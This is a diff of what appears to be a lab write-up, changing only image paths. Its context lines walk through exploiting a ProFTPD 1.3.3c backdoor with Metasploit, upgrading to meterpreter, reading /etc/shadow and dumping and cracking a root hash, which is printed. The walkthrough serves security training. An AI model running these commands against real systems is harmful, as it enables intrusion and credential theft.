@@ -48,7 +48,7 @@ Service Info: OS: Unix
 searchsploit proftpd 1.3.3
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (15) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Exploitation
 
@@ -57,7 +57,7 @@ service postgresql start && msfconsole -q
 msf5 > search proftpd
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Start a metasploit framework and exploit proftpd server using `exploit/unix/ftp/proftpd_133c_backdoor` module.
 
@@ -67,7 +67,7 @@ msf5 > use exploit/unix/ftp/proftpd_133c_backdoor
 msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Upgrade the sessions to a `meterpreter` session
 
@@ -78,14 +78,14 @@ sessions # check available sessions
 sessions 2
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 meterpreter > sysinfo
 meterpreter > getuid
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Hashes Dumping <a href="#hashes-dumping" id="hashes-dumping"></a>
 
@@ -94,7 +94,7 @@ meterpreter > cat /etc/shadow
     root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:18348:0:99999:7:::
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Gather Linux Password hashes with `Metasploit`
 
@@ -107,9 +107,9 @@ msf5 post(linux/gather/hashdump) > set SESSION 2
 msf5 post(linux/gather/hashdump) > run
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 [+] root:$6$sgewtGbw$ihhoUYASuXTh7Dmw0adpC7a3fBGkf9hkOQCffBQRMIF8/0w6g/Mh4jMWJ0yEFiZyqVQhZ4.vuS8XOyq.hLQBb.:0:0:root:/root:/bin/bash
@@ -128,7 +128,7 @@ set SHA512 true
 run
 ```
 
-<figure><img src="../../../../../.gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
 Flag: `password`
